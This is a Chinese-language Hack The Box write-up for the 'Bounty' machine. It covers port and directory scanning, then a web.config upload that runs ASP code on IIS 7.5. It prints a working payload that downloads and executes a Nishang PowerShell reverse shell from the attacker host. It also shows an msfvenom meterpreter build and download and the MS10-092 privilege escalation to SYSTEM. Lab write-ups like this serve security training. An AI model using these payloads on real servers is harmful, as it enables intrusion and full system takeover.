# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务发现
```
┌──(root💀kali)-[~/htb/Bounty]
└─# nmap -sV -Pn 10.10.10.93 -p-                                                                                                                                                                                                        1 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-16 22:37 EST
Nmap scan report for 10.10.10.93
Host is up (0.27s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 360.04 seconds

```

## 目录爆破
```
└─# gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x aspx                    
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.93
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/16 22:44:15 Starting gobuster in directory enumeration mode
===============================================================
/transfer.aspx        (Status: 200)
/aspnet_client        (Status: 301) [Size: 156] [--> http://10.10.10.93/aspnet_client/]
/uploadedfiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedfiles/]
                                                                                       
===============================================================
2021/12/16 22:46:25 Finished
===============================================================

```

transfer.aspx是一个文件上传页面


所有成功上传的文件都会到uploadedfiles下，不过这个目录下的文件过一段时间（几十秒）就会被删除

使用burpsuite，截断上传页面信息，使用intruder，爆破扩展名，发现允许上传的扩展名包括:```gif,jpg,png,config```

查了下IIS7.5下有一个畸形解析漏洞，但是好像无法复现

试过传图片码，各种截断，但是好像无法绕过

在谷歌上搜索```IIS httpd 7.5 upload rce```

找到了[这篇文章](https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/)

可以上传一个```web.config```文件，在注释里执行asp代码
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<!–-
<% Response.write("-"&"->")
Response.write("<pre>")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("ipconfig")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><!-"&"-") %>

-–>

```
上面文件上传以后访问```http://10.10.10.93/uploadedfiles/web.config```成功打印```ipconfig```命令
```
Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.93
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{27C3F487-28AC-4CE6-AE3A-1F23518EF7A7}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

```

下面我们准备一个反弹shell，把github上的[这个脚本](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)下载到本地，并且在脚本最下方加入一行代码：
> Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 4242

把```web.config```编辑成以下payload
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<!–-
<% Response.write("-"&"->")
Response.write("<pre>")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.3/Invoke-PowerShellTcp.ps1')")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><!-"&"-") %>

-–>

```

在本地开启一个http服务，准备传送```Invoke-PowerShellTcp.ps1```
> python3 -m http.server 80 

kali开启监听接收反弹shell
> nc -lnvp 4242

上传以后，打开```http://10.10.10.93/uploadedfiles/web.config```页面，拿到初始shell
```
┌──(root💀kali)-[~/htb/Bounty]
└─# nc -lnvp 4242              
listening on [any] 4242 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.93] 49158
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
bounty\merlin

```

拿到了初始shell
然而无法找到user.txt

# 提权

webshell不太稳定，我们编译一个稳定的meterpreter

> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe > shell64.exe

在靶机依次执行下面两行代码，把shell下载到靶机

> $client = new-object System.Net.WebClient

> $client.DownloadFile('http://10.10.14.3:8000/shell64.exe', 'C:\users\merlin\Desktop\shell64.exe')

powershell执行exe文件
> &"C:\users\merlin\Desktop\shell64.exe"

拿到meterpreter以后，把winPEAS.bat 传到靶机，枚举提权漏洞

```
"Microsoft Windows Server 2008 R2 Datacenter "                                                                                                                                                                                              
   [i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)                                                                                                                                           
MS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys)                                                                                                                                                                                     
MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)                                                                                                                                                                  
MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)                                                                                                                                               
MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)                                                                                                                                                                                 
MS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)                                                                                                                                              
MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)                                                                                                                                                                   
MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)                                                                                                                                                 
MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)                                                                                                                                                              
MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)                                                                                                                                                                    
MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)                                                                                                                                                     
MS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)                                                                                                                                                                                      
MS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)                                                                                                                                                                                       
MS05-055 patch is NOT installed 2K/SP4-APC Data-Free)                                                                                                                                                                                       
MS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)                                                                                                                                                                                    
MS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)                                                                                                                                                                                 
MS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)                                                                                                                                                                      
MS04-020 patch is NOT installed 2K/SP4-POSIX)                                                                                                                                                                                               
MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)                                                                                                                                                   
MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)                                                                                                                                                                
MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)                                                                                                                                                                 
MS14-070 patch is NOT installed 2K3/SP2-TCP/IP)                                                                                                                                                                                             
MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)                                                                                                                                                               
MS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)                                                                                                                                                                                   
MS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu)   
```

可以看见靶机很多补丁没有安装，逐个枚举，使用MS10-092

```
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > search MS10-092

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/windows/local/ms10_092_schelevator  2010-09-13       excellent  Yes    Windows Escalate Task Scheduler XML Privilege Escalation


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/ms10_092_schelevator

```

提权
```
msf6 exploit(windows/local/ms10_092_schelevator) > run

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Preparing payload at C:\Windows\TEMP\AoTizOUxSB.exe
[*] Creating task: LXJM4TwyEqICqyv
[*] SUCCESS: The scheduled task "LXJM4TwyEqICqyv" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\LXJM4TwyEqICqyv...
[*] Original CRC32: 0x866f314a
[*] Final CRC32: 0x866f314a
[*] Writing our modified content back...
[*] Validating task: LXJM4TwyEqICqyv
[*] 
[*] Folder: \
[*] TaskName                                 Next Run Time          Status         
[*] ======================================== ====================== ===============
[*] LXJM4TwyEqICqyv                          1/1/2022 5:38:00 AM    Ready          
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "LXJM4TwyEqICqyv" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "LXJM4TwyEqICqyv" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (175174 bytes) to 10.10.10.93
[*] SUCCESS: Attempted to run the scheduled task "LXJM4TwyEqICqyv".
[*] SCHELEVATOR
[*] Deleting the task...
[*] Meterpreter session 2 opened (10.10.14.3:4444 -> 10.10.10.93:49175) at 2021-12-20 22:38:40 -0500
[*] SUCCESS: The scheduled task "LXJM4TwyEqICqyv" was successfully deleted.
[*] SCHELEVATOR

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

已经拿到SYSTEM权限，至此我们可以读取系统内任何文件。
user.txt在普通用户权限下无法查看到，但是在system下是可以的。
```
meterpreter > search -f user.txt
Found 1 result...
    c:\Users\merlin\Desktop\user.txt (32 bytes)
meterpreter > search -f root.txt
Found 1 result...
    c:\Users\Administrator\Desktop\root.txt (32 bytes)

```

# 总结
本文渗透的是windows主机，nmap扫描出中间件是IIS7.5，通过网页信息知道靶机运行aspx程序
爆破时选择字典指定了扩展名aspx
当得知有一个上传点时，优先需要知道中间件的解析漏洞信息，以及rce利用信息
通过rce得到初始shell
提权的时候，看到初始用户开启了```SeImpersonatePrivilege```,也可以考虑用potato提权